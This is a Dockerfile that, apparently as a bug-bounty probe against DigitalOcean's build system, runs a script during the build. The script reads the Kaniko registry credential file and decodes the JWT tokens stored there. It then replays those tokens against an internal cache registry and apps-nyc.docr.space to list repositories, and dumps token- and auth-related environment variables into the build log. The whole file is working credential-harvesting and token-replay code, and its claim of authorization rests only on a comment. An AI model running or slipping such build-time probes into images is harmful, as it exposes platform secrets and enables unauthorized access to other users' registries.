FROM alpine:3.20

RUN apk add --no-cache curl jq bash coreutils

# Authorized bug-bounty probe: DigitalOcean program on Intigriti
# Researcher: greghax01@intigriti.me. Greg-owned resources only.
# READ-ONLY registry probes against build-phase accessible endpoints.

RUN bash -c 'set +e; \
echo "=== DOCR JWT SCOPE PROBE v2 ===" >&2; \
\
echo "--- Config keys ---" >&2; \
if [ -f /kaniko/.docker/config.json ]; then \
  echo "Config exists" >&2; \
  jq "keys" /kaniko/.docker/config.json >&2 2>/dev/null; \
  echo "---registrytokens keys---" >&2; \
  jq -r ".registrytokens | keys" /kaniko/.docker/config.json >&2 2>/dev/null; \
  echo "---auths keys---" >&2; \
  jq -r ".auths | keys" /kaniko/.docker/config.json >&2 2>/dev/null; \
  \
  echo "--- JWT token decode for each registrytoken ---" >&2; \
  for RHOST in $(jq -r ".registrytokens // {} | keys[]" /kaniko/.docker/config.json 2>/dev/null); do \
    echo "Token host: $RHOST" >&2; \
    TOKEN=$(jq -r ".registrytokens[\"$RHOST\"]" /kaniko/.docker/config.json 2>/dev/null); \
    echo "Token len: ${#TOKEN}" >&2; \
    echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq . >&2 2>/dev/null; \
    echo "---" >&2; \
  done; \
  \
  echo "--- Mirror catalog (noauth) ---" >&2; \
  MIRROR_CAT=$(curl -s --connect-timeout 5 "http://docker-cache.docker-cache.svc.cluster.local:5000/v2/_catalog?n=500" 2>/dev/null); \
  echo "Mirror catalog: $MIRROR_CAT" >&2; \
  \
  echo "--- Mirror catalog with each token ---" >&2; \
  for RHOST in $(jq -r ".registrytokens // {} | keys[]" /kaniko/.docker/config.json 2>/dev/null); do \
    TOKEN=$(jq -r ".registrytokens[\"$RHOST\"]" /kaniko/.docker/config.json 2>/dev/null); \
    echo "Catalog with $RHOST token:" >&2; \
    curl -s --connect-timeout 5 "http://docker-cache.docker-cache.svc.cluster.local:5000/v2/_catalog?n=500" \
      -H "Authorization: Bearer $TOKEN" >&2 2>/dev/null; \
    echo "" >&2; \
  done; \
  \
  echo "--- Try apps-nyc.docr.space catalog with each token ---" >&2; \
  for RHOST in $(jq -r ".registrytokens // {} | keys[]" /kaniko/.docker/config.json 2>/dev/null); do \
    TOKEN=$(jq -r ".registrytokens[\"$RHOST\"]" /kaniko/.docker/config.json 2>/dev/null); \
    echo "Apps-docr catalog with $RHOST token:" >&2; \
    curl -s --connect-timeout 5 "https://apps-nyc.docr.space/v2/_catalog?n=500" \
      -H "Authorization: Bearer $TOKEN" >&2 2>/dev/null; \
    echo "" >&2; \
  done; \
  \
  echo "--- Try apps-nyc.docr.space list own app tags ---" >&2; \
  APPS_TOKEN=$(jq -r ".registrytokens // {} | to_entries[0].value // empty" /kaniko/.docker/config.json 2>/dev/null); \
  OWN_REPO=$(echo "$APPS_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r ".access[0].name // empty" 2>/dev/null); \
  echo "Own repo: $OWN_REPO" >&2; \
  if [ -n "$OWN_REPO" ]; then \
    echo "Own tags:" >&2; \
    curl -s --connect-timeout 5 "https://apps-nyc.docr.space/v2/$OWN_REPO/tags/list" \
      -H "Authorization: Bearer $APPS_TOKEN" >&2 2>/dev/null; \
    echo "" >&2; \
  fi; \
  \
  echo "--- ENV dump ---" >&2; \
  env | sort | grep -iE "DOCKER|REGISTRY|TOKEN|AUTH|MIRROR|CACHE|APP|IMAGE" >&2 2>/dev/null; \
  \
else \
  echo "No kaniko config found" >&2; \
fi; \
\
echo "=== PROBE COMPLETE ===" >&2; \
true'

CMD ["echo", "probe-complete"]
